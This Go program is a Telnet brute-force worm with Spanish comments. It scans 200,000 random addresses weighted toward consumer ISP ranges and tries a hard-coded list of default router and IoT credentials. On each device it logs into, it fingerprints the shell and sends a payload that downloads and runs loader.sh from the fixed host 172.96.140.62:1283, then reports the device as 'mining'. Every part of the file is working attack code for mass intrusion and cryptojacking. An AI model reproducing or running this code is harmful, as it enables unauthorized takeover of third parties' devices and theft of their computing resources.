package main

import (
	"bytes"
	"fmt"
	"net"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
	"strings"
	"math/rand"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	// Credenciales MÁS comunes en routers vulnerables (priorizadas)
	{"root", "root"},
	{"root", ""},
	{"root", "admin"},
	{"admin", "admin"},
	{"admin", ""},
	{"root", "1234"},
	{"admin", "1234"},
	{"root", "password"},
	{"admin", "password"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "123456"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "toor"},
	{"root", "vizxv"},      // Cámaras IP chinas
	{"admin", "vizxv"},
	{"root", "xc3511"},      // Routers chinos
	{"admin", "xc3511"},
	{"root", "Zte521"},      // ZTE routers
	{"admin", "Zte521"},
	{"root", "telecomadmin"}, // Routers Latinoamérica
	{"admin", "telecomadmin"},
	{"root", "user"},
	{"admin", "user"},
	{"root", "support"},
	{"admin", "support"},
	{"ubnt", "ubnt"},         // Ubiquiti
	{"pi", "raspberry"},      // Raspberry Pi
	{"root", "anko"},         // Routers chinos
	{"admin", "anko"},
	{"root", "system"},
	{"admin", "system"},
	{"root", "12345"},
	{"admin", "12345"},
	{"root", "changeme"},
	{"admin", "changeme"},
	{"root", "letmein"},
	{"admin", "letmein"},
	{"root", "admin123"},
	{"admin", "admin123"},
	{"root", "password123"},
	{"admin", "password123"},
	{"root", "root123"},
	{"admin", "root123"},
}

// Payloads multi-sistema para minería
var PAYLOADS = []string{
	// Para sistemas con wget (prioritario)
	"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://172.96.140.62:1283/loader.sh -O .l; sh .l &",
	// Para sistemas con curl
	"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -s http://172.96.140.62:1283/loader.sh -o .l; sh .l &",
	// Para sistemas con busybox
	"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget -q http://172.96.140.62:1283/loader.sh -O .l; sh .l &",
	// Para sistemas con tftp (dispositivos embebidos)
	"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -g -r loader.sh 172.96.140.62 1283; chmod +x loader.sh; ./loader.sh &",
	// Para sistemas con ftp
	"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -u anonymous -p anonymous 172.96.140.62 loader.sh .l; sh .l &",
	// Para sistemas con bash y /dev/tcp
	"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; exec 3<>/dev/tcp/172.96.140.62/1283; echo -e 'GET /loader.sh HTTP/1.0\n\n' >&3; cat <&3 > .l; sh .l &",
	// Payload ultra-ligero para sistemas muy limitados
	"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; echo -e '#!/bin/sh\nwget -q http://172.96.140.62:1283/loader.sh -O .l && sh .l' > .x; chmod +x .x; sh .x &",
}

const (
	TELNET_TIMEOUT    = 8 * time.Second
	MAX_WORKERS       = 5000
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 500000
	CONNECT_TIMEOUT   = 4 * time.Second
)

type CredentialResult struct {
	Host        string
	Username    string
	Password    string
	Output      string
	PayloadUsed string
	SystemInfo  string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
	}
}

// Detectar sistema y elegir payload adecuado
func (s *TelnetScanner) detectAndExecute(conn net.Conn, host string) (bool, string, string, string) {
	var systemInfo strings.Builder
	
	// Comandos de detección específicos
	detectCommands := []string{
		"uname -a\n",
		"cat /proc/version\n",
		"busybox | head -1\n",
		"which wget\n",
		"which curl\n",
		"which tftp\n",
		"which ftp\n",
		"ls -la /bin/busybox\n",
		"echo $0\n",
		"cat /etc/os-release 2>/dev/null\n",
		"cat /proc/cpuinfo | grep model\n",
	}
	
	for _, cmd := range detectCommands {
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		conn.Write([]byte(cmd))
		
		buf := make([]byte, 512)
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, _ := conn.Read(buf)
		if n > 0 {
			systemInfo.Write(buf[:n])
		}
		time.Sleep(100 * time.Millisecond)
	}
	
	info := systemInfo.String()
	
	// Elegir payload basado en el sistema detectado
	var selectedPayload string
	
	switch {
	case strings.Contains(info, "wget"):
		selectedPayload = PAYLOADS[0]
	case strings.Contains(info, "curl"):
		selectedPayload = PAYLOADS[1]
	case strings.Contains(info, "busybox"):
		selectedPayload = PAYLOADS[2]
	case strings.Contains(info, "tftp"):
		selectedPayload = PAYLOADS[3]
	case strings.Contains(info, "ftp"):
		selectedPayload = PAYLOADS[4]
	case strings.Contains(info, "bash"):
		selectedPayload = PAYLOADS[5]
	default:
		selectedPayload = PAYLOADS[6]
	}
	
	// Ejecutar payload
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, err := conn.Write([]byte(selectedPayload + "\n"))
	if err != nil {
		return false, "", selectedPayload, info
	}
	
	// Verificar ejecución
	time.Sleep(2 * time.Second)
	conn.Write([]byte("ps | grep -E 'loader|wget|curl'\n"))
	time.Sleep(1 * time.Second)
	
	output := s.readCommandOutput(conn)
	
	return true, output, selectedPayload, info
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
	
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			// Detectar sistema y ejecutar payload
			success, output, payloadUsed, systemInfo := s.detectAndExecute(conn, host)
			if success {
				return true, CredentialResult{
					Host:        host,
					Username:    username,
					Password:    password,
					Output:      output,
					PayloadUsed: payloadUsed,
					SystemInfo:  systemInfo,
				}
			}
			return false, "payload execution failed"
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := TELNET_TIMEOUT / 2

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}
	
	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		found := false
		if host == "" {
			continue
		}
		
		// Intentar primero las credenciales más comunes (optimización)
		topCreds := CREDENTIALS[:20]
		for _, cred := range topCreds {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				credResult := result.(CredentialResult)
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()
				
				fmt.Printf("\n[🔥] VULNERABLE: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
				fmt.Printf("[📱] Sistema: %s\n", credResult.SystemInfo[:min(100, len(credResult.SystemInfo))])
				fmt.Printf("[💻] Payload: %s\n", credResult.PayloadUsed)
				fmt.Printf("[✓] MINER ACTIVADO\n\n")
				
				found = true
				break
			}
		}
		
		// Si no funciona, probar el resto
		if !found {
			for _, cred := range CREDENTIALS[20:] {
				success, result := s.tryLogin(host, cred.Username, cred.Password)
				if success {
					atomic.AddInt64(&s.valid, 1)
					
					credResult := result.(CredentialResult)
					s.lock.Lock()
					s.foundCredentials = append(s.foundCredentials, credResult)
					s.lock.Unlock()
					
					fmt.Printf("\n[🔥] VULNERABLE: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
					fmt.Printf("[📱] Sistema: %s\n", credResult.SystemInfo[:min(100, len(credResult.SystemInfo))])
					fmt.Printf("[💻] Payload: %s\n", credResult.PayloadUsed)
					fmt.Printf("[✓] MINER ACTIVADO\n\n")
					
					found = true
					break
				}
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()
	lastValid := int64(0)

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			newValid := valid - lastValid
			lastValid = valid
			
			fmt.Printf("\r📊 Total: %d | ✅ Encontrados: %d (+%d) | ❌ Fallidos: %d | 📥 Cola: %d | 🧵 Routines: %d", 
				scanned, valid, newValid, invalid, queueSize, runtime.NumGoroutine())
		}
	}
}

// Función mejorada para generar IPs de rangos altamente vulnerables
func generateVulnerableIPs() []string {
	var ips []string
	
	// RANGOS ESPECÍFICOS ALTAMENTE VULNERABLES
	// Basado en estadísticas de dispositivos IoT con telnet abierto
	
	vulnerableRanges := []struct {
		network string
		weight  int  // Mayor peso = más IPs de ese rango
	}{
		// 🇧🇷 BRASIL - VIVO, CLARO, OI (MUY VULNERABLES)
		{"177.", 50},
		{"179.", 50},
		{"187.", 50},
		{"189.", 50},
		{"191.", 50},
		{"200.1", 30},
		{"200.2", 30},
		{"201.", 40},
		
		// 🇲🇽 MÉXICO - TELMEX, IZZI, TOTALPLAY
		{"187.1", 40},
		{"189.1", 40},
		{"201.1", 40},
		{"200.5", 30},
		{"200.6", 30},
		
		// 🇨🇴 COLOMBIA - CLARO, MOVISTAR, TIGO
		{"186.8", 35},
		{"190.2", 35},
		
		// 🇦🇷 ARGENTINA - TELECOM, PERSONAL, CLARO
		{"181.", 35},
		{"186.", 35},
		{"190.1", 30},
		
		// 🇵🇪 PERÚ - MOVISTAR, CLARO, ENTEL
		{"179.6", 30},
		{"181.6", 30},
		{"190.4", 30},
		{"200.6", 30},
		
		// 🇨🇱 CHILE - MOVISTAR, CLARO, ENTEL
		{"186.", 30},
		{"190.", 30},
		{"200.8", 30},
		
		// 🌏 ASIA - CHINA, INDIA, VIETNAM (MUY VULNERABLES)
		{"58.", 40},
		{"59.", 40},
		{"60.", 40},
		{"61.", 40},
		{"101.", 40},
		{"110.", 40},
		{"111.", 40},
		{"112.", 40},
		{"113.", 40},
		{"114.", 40},
		{"115.", 40},
		{"116.", 40},
		{"117.", 40},
		{"118.", 40},
		{"119.", 40},
		{"120.", 40},
		{"121.", 40},
		{"122.", 40},
		{"123.", 40},
		{"124.", 40},
		{"125.", 40},
		{"175.", 30},
		{"180.", 30},
		{"182.", 30},
		{"183.", 30},
		{"202.", 30},
		{"203.", 30},
		{"210.", 30},
		{"218.", 30},
		{"219.", 30},
		{"220.", 30},
		
		// 🇻🇳 VIETNAM - ESPECIALMENTE VULNERABLE
		{"113.", 35},
		{"114.", 35},
		{"115.", 35},
		{"116.", 35},
		{"117.", 35},
		
		// 🇮🇳 INDIA - BHARTI, RELIANCE
		{"117.", 30},
		{"118.", 30},
		{"119.", 30},
		{"120.", 30},
		{"121.", 30},
		{"122.", 30},
		
		// 🌍 EUROPA - PAÍSES CON MÁS DISPOSITIVOS VULNERABLES
		{"78.", 25},
		{"79.", 25},
		{"80.", 25},
		{"81.", 25},
		{"82.", 25},
		{"83.", 25},
		{"84.", 25},
		{"85.", 25},
		{"86.", 25},
		{"87.", 25},
		{"88.", 25},
		{"89.", 25},
		{"90.", 25},
		{"91.", 25},
		{"92.", 25},
		{"93.", 25},
		{"94.", 25},
		{"95.", 25},
	}
	
	fmt.Println("[🌐] Generando IPs de rangos altamente vulnerables...")
	
	totalIPs := 200000 // Escaneo masivo
	ips = make([]string, totalIPs)
	
	for i := 0; i < totalIPs; i++ {
		// Seleccionar rango basado en peso
		var selectedRange string
		totalWeight := 0
		for _, r := range vulnerableRanges {
			totalWeight += r.weight
		}
		
		randWeight := rand.Intn(totalWeight)
		cumulative := 0
		for _, r := range vulnerableRanges {
			cumulative += r.weight
			if randWeight < cumulative {
				selectedRange = r.network
				break
			}
		}
		
		// Generar IP dentro del rango seleccionado
		if strings.Contains(selectedRange, ".") {
			// Es un prefijo específico
			parts := strings.Split(selectedRange, ".")
			ip := parts[0] + "." + parts[1] + "." + 
				fmt.Sprintf("%d", rand.Intn(256)) + "." + 
				fmt.Sprintf("%d", 1+rand.Intn(254))
			ips[i] = ip
		} else {
			// Es un rango completo
			ip := selectedRange + 
				fmt.Sprintf("%d.", rand.Intn(256)) + 
				fmt.Sprintf("%d.", rand.Intn(256)) + 
				fmt.Sprintf("%d", 1+rand.Intn(254))
			ips[i] = ip
		}
	}
	
	fmt.Printf("[✓] Generadas %d IPs vulnerables\n", len(ips))
	return ips
}

func (s *TelnetScanner) Run() {
	fmt.Printf("\n\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║     🔥 TELNET MINER - RANGOS VULNERABLES ULTRA 🔥        ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Workers: %d | Timeout: %v                            ║\n", MAX_WORKERS, TELNET_TIMEOUT)
	fmt.Printf("║ Credenciales: %d | Payloads: %d                         ║\n", len(CREDENTIALS), len(PAYLOADS))
	fmt.Printf("║ Objetivo: cd /tmp && wget loader.sh && sh .l             ║\n")
	fmt.Printf("╚══════════════════════════════════════════════════════════╝\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		vulnerableIPs := generateVulnerableIPs()
		
		fmt.Printf("\n[🚀] Iniciando escaneo masivo...\n\n")
		
		for _, host := range vulnerableIPs {
			atomic.AddInt64(&s.queueSize, 1)
			s.hostQueue <- host
		}
		
		fmt.Printf("[✓] Escaneo iniciado con %d objetivos\n", len(vulnerableIPs))
		stdinDone <- true
	}()

	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	
	fmt.Println("\n\n╔══════════════════════════════════════════════════════════╗")
	fmt.Println("║                    ESCANEO COMPLETADO                      ║")
	fmt.Println("╠══════════════════════════════════════════════════════════╣")
	fmt.Printf("║ Total escaneados: %-30d ║\n", scanned)
	fmt.Printf("║ Dispositivos vulnerables: %-26d ║\n", valid)
	if scanned > 0 {
		fmt.Printf("║ Tasa de éxito: %-30.2f%% ║\n", float64(valid)/float64(scanned)*100)
	} else {
		fmt.Printf("║ Tasa de éxito: %-30.2f%% ║\n", 0.0)
	}
	fmt.Println("╚══════════════════════════════════════════════════════════╝")
	
	if len(s.foundCredentials) > 0 {
		fmt.Println("\n📋 DISPOSITIVOS COMPROMETIDOS (MINER ACTIVADO):")
		fmt.Println("──────────────────────────────────────────────────")
		for i, cred := range s.foundCredentials {
			fmt.Printf("%d. %s | %s:%s\n", i+1, cred.Host, cred.Username, cred.Password)
		}
		fmt.Printf("\n✅ TOTAL: %d DISPOSITIVOS MINANDO\n", len(s.foundCredentials))
		fmt.Println("💰 Minería activada en todos los dispositivos")
	}
}

func main() {
	scanner := NewTelnetScanner()
	scanner.Run()
}
